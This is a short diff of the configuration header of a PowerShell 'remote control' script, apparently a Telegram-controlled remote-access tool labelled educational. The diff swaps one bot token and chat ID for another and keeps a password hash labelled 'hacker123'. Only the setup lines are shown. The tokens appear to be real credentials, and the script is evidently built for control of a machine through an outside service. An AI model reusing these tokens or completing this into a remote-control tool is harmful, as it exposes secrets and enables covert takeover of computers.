@@ -1,8 +1,8 @@
-﻿# Remote Control PowerShell Script (Converted from Python with Inline Buttons)
+# Remote Control PowerShell Script (Converted from Python with Inline Buttons)
 # For educational purposes only
 
-$BOT_TOKEN = "8359294510:AAFxIG_U3J7B8BjJtMgoJx11o6XAR1v_frA" # توکن خودت
-$CHAT_ID = "8331252281" # Chat ID خودت
+$BOT_TOKEN = "8471022586:AAEvm-9YLm_x2fATjVOL7_vCfn4YTotEH_c" # توکن خودت
+$CHAT_ID = "7645737658" # Chat ID خودت
 $PASSWORD_HASH = "6f8c31653fa8345f2929c2c0e6f2a62c" # MD5 hash of "hacker123"
 $API_URL = "https://api.telegram.org/bot$BOT_TOKEN"
 $LogPath = Join-Path $env:TEMP "bot.log"
